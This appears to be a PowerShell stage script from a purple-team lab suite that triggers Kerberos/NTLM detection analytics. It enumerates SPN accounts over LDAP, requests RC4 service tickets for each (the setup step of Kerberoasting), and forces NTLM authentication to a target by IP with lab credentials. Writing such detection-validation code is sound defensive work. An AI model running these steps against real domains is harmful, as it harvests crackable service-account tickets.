<#
    Stage 3 - Credential Access
    ===========================
    Two behaviours the EAL Kerberos/NTLM analytics key on:

      (a) Kerberoasting with RC4 -> "Weakly-Encrypted Kerberos TGT Response"
                                    (T1556.001, Informational)
      (b) NTLM downgrade / first-time NTLM by the user
                                 -> "Rare NTLM Usage by User" (T1550, Informational)

    (a) requests service tickets (TGS) for SPN accounts using the legacy
        RC4 (etype 23) encryption, which is what makes tickets crackable.
    (b) forces an NTLM authentication to a host by IP (bypasses Kerberos).

    Requires: a reachable DC + at least one SPN service account in the lab.
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\..\config\lab-config.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 3: Credential access (Kerberoast RC4 + NTLM downgrade)" "INFO"

# --- (a) Request RC4 service tickets for every SPN we can find -------------
Write-Stage "Requesting RC4 (etype 23) service tickets for SPN accounts..." "INFO"
Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue

# Discover SPNs via LDAP (reuse of the recon technique, scoped to SPNs).
$spns = @()
try {
    $entry    = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($cfg.DomainController)")
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($entry, "(&(samAccountType=805306368)(servicePrincipalName=*))")
    $searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
    foreach ($r in $searcher.FindAll()) {
        $spns += $r.Properties["serviceprincipalname"] | Select-Object -First 1
    }
} catch { Write-Stage "SPN discovery failed: $($_.Exception.Message)" "WARN" }

if (-not $spns) {
    Write-Stage "No SPNs discovered - using a sample SPN so the request still fires." "WARN"
    $spns = @("MSSQLSvc/db01.$($cfg.Domain):1433", "HTTP/web01.$($cfg.Domain)")
}

foreach ($spn in ($spns | Select-Object -Unique)) {
    if ($cfg.DryRun) { Write-Host "  DRY: TGS request (RC4) for $spn"; continue }
    try {
        # KerberosRequestorSecurityToken forces a real TGS-REQ to the DC.
        $tok = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        Write-Stage "  Requested ticket for $spn" "OK"
    } catch {
        Write-Stage "  Ticket request for $spn failed: $($_.Exception.Message)" "WARN"
    }
    Start-Sleep -Milliseconds $cfg.DelayBetweenReqMs
}
Write-Stage "Tip: 'klist' shows the cached tickets; RC4 (etype 23) is the weak one." "INFO"

# --- (b) Force NTLM authentication by connecting to the target via IP ------
Write-Stage "Forcing NTLM authentication to $($cfg.LateralTargetIp) (bypasses Kerberos)..." "INFO"
$uncByIp = "\\$($cfg.LateralTargetIp)\IPC$"
if ($cfg.DryRun) {
    Write-Host "  DRY: net use $uncByIp  (NTLM because target is addressed by IP)"
} else {
    try {
        # Connecting by IP (not FQDN) makes Windows fall back to NTLM.
        & net use $uncByIp /user:"$($cfg.LabUser)" $cfg.LabPassword 2>$null | Out-Null
        Write-Stage "  NTLM auth attempted to $uncByIp" "OK"
        & net use $uncByIp /delete /y 2>$null | Out-Null
    } catch {
        Write-Stage "  NTLM auth attempt error: $($_.Exception.Message)" "WARN"
    }
}
Write-Stage "STAGE 3 done. Expect: 'Weakly-Encrypted Kerberos TGT Response' + 'Rare NTLM Usage by User'." "OK"

